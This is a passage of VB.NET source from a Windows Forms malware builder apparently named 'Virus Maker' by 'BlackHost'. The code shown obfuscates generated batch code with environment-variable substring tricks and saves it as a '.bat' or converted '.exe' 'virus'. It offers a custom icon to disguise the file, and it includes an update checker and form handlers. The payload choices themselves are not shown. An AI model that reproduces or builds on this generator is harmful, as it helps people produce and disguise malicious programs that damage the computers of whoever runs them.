            TextBox9.Text = Strings.Replace(TextBox9.Text, "z", "%x:~26,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "£", "0")
            TextBox9.Text = "@echo off" + vbCrLf + "set x=aabcdefghijklmnopqrstuvwxyz0" + TextBox9.Text
        End If
        '' end codes
        If ComboBox1.Text = ".bat" Then
            ''savefiledialog batch
            Dim filenamePath As String
            Dim sfd As New SaveFileDialog
            sfd.DefaultExt = ComboBox1.Text
            sfd.FileName = TextBox8.Text
            sfd.Title = "Save batch virus"
            sfd.Filter = "Batch file (*.bat)|*.bat"
            sfd.FilterIndex = 1
            Dim filename As String
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                filename = sfd.FileName
                filenamePath = filename
                TextBox10.Text = filename
            Else : Exit Sub
            End If
            ''writing batch
            write = System.IO.File.AppendText(TextBox10.Text)
            write.WriteLine(TextBox9.Text)
            write.Close()
            MsgBox("Virus succesfully generated.", MsgBoxStyle.Information, "Information")
        ElseIf ComboBox1.Text = ".exe" Then
            'If Not IO.File.Exists(TextBox1.Text) Then
            'MsgBox("Please Select A Valid Batch File!", MsgBoxStyle.Critical, "Error")
            'Exit Sub
            'End If
            'Dim sfda As New SaveFileDialog
            'sfda.Filter = "Executable files (*.exe)|*.exe"
            'If sfda.ShowDialog <> vbOK Then
            ' Button1.Text = "save"
            ' Exit Sub
            'End If
            'Dim tConverta As New Threading.Thread(AddressOf ConvertBtE)
            'tConvert.Start(sfda.FileName)
            Dim sfd As New SaveFileDialog
            sfd.FileName = TextBox8.Text
            sfd.Title = "Save executable virus"
            sfd.Filter = "Executable (*.exe)|*.exe"
            If sfd.ShowDialog <> vbOK Then
                Exit Sub
            End If
            TextBox10.Text = sfd.FileName
            Dim Convert As New Threading.Thread(AddressOf ConvertBtE)
            Convert.Start(sfd.FileName)
            'change icon
            'If Not Form9.TextBox1.Text = "" Then
            MsgBox("Virus succesfully generated.", MsgBoxStyle.Information, "Information")
            If Form9.TextBox1.Text = "" Then
                Dim msg As String
                Dim title As String
                Dim style As MsgBoxStyle
                Dim response As MsgBoxResult
                msg = "Do you want to set an icon?"
                title = "Information"
                style = MsgBoxStyle.Question + MsgBoxStyle.YesNo
                response = MsgBox(msg, style, title)
                If response = MsgBoxResult.Yes Then
                    Dim ssfd As New OpenFileDialog
                    ssfd.Title = "Choose an icon"
                    ssfd.DefaultExt = ".ico"
                    ssfd.Filter = "Icon (*.ico)|*.ico"
                    ssfd.FilterIndex = 1
                    Dim ffilename As String
                    If ssfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                        ffilename = ssfd.FileName
                        Form9.TextBox1.Text = ffilename
                        Form9.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
                        PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage
                        Form9.PictureBox1.ImageLocation = ffilename
                        PictureBox2.ImageLocation = ffilename
                    Else : Exit Sub
                    End If
                    ChangeIcon()
                    'Else
                    'msgresult no
                End If
            Else
                ChangeIcon()
            End If
        Else
            MsgBox("Please select a valid extension.", MsgBoxStyle.Critical, "Error")
        End If
    End Sub
    ''information box
    Private Sub MEnter(sender As Object, e As EventArgs) Handles LinkLabel1.MouseEnter
        Form2.Show()
    End Sub
    Private Sub MLeave(sender As Object, e As EventArgs) Handles LinkLabel1.MouseLeave
        Form2.Close()
    End Sub
    ''end information box
    ''show forms
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Form3.Show()
    End Sub
    Private Sub CheckBox9_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox9.CheckedChanged
        If CheckBox9.Checked = True Then
            Form3.Show()
        End If
    End Sub
    Private Sub CheckBox14_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox14.CheckedChanged
        If CheckBox14.Checked = True Then
            Form4.Show()
        End If
    End Sub
    Private Sub CheckBox15_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox15.CheckedChanged
        If CheckBox15.Checked Then
            Form5.Show()
        End If
    End Sub
    Private Sub CheckBox16_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox16.CheckedChanged
        If CheckBox16.Checked Then
            Form6.Show()
        End If
    End Sub
    Private Sub CheckBox17_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox17.CheckedChanged
        If CheckBox17.Checked Then
            Form7.Show()
        End If
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Form8.Show()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Form9.Show()
    End Sub
    ''end show forms
    'info button
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        MsgBox("This program was developed by BlackHost." + vbCrLf + "Copyright © BlackHost. All rights reserved." + vbCrLf + "www.blackhost.xyz", MsgBoxStyle.Information, "Credits")
    End Sub
    ''checkupdates function
    Public Sub CheckForUpdates()
        Dim file As String = Application.StartupPath & "/version"
        Dim MyVer As String = My.Application.Info.Version.ToString
        If My.Computer.FileSystem.FileExists(file) Then
            My.Computer.FileSystem.DeleteFile(file)
        End If
        Try
            My.Computer.Network.DownloadFile("http://www.blackhost.xyz/prg/vm/version.txt", file)
            Dim LastVer As String = My.Computer.FileSystem.ReadAllText(file)
            If Not MyVer = LastVer Then
                Dim msgg As String
                Dim titlee As String
                Dim stylee As MsgBoxStyle
                Dim resultt As MsgBoxResult
                msgg = "An update is available. Do you want to visit BlackHost now?"
                titlee = "Update"
                stylee = MsgBoxStyle.Information + MsgBoxStyle.YesNo
                resultt = MsgBox(msgg, stylee, titlee)
                'Dim update As String = Application.StartupPath + "/Virus Maker Updated.exe"
                If resultt = MsgBoxResult.Yes Then
                    Try
                        'My.Computer.Network.DownloadFile("http://www.blackhost.xyz/prg/vm/vm.exe", update)
                        'MsgBox("Download succesfully started.", MsgBoxStyle.Information, "Information")
                        'MsgBox("Update available.", MsgBoxStyle.Information, "Update")
                        'My.Computer.Network.DownloadFile(&q­uot;http://www.blackhost.xyz/prg/vm/vm.exe", update)
                        Dim website As String = "http://www.blackhost.xyz/?id=vm"
                        Process.Start(website)
                    Catch ex As Exception
                        MsgBox("An error occured.", MsgBoxStyle.Critical, "Error")
                    End Try
                End If
            Else : MsgBox("Program is up to date.", MsgBoxStyle.Information, "Update")
            End If
        Catch ex As Exception
            MsgBox("An error occured.", MsgBoxStyle.Critical, "Error")
        End Try
    End Sub
    ''button check
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        CheckForUpdates()
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Form9.Show()
    End Sub

    Private Sub Label16_Click(sender As Object, e As EventArgs) Handles Label16.Click
        System.Diagnostics.Process.Start("http://www.blackhost.xyz")
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Form10.Show()
    End Sub
End Class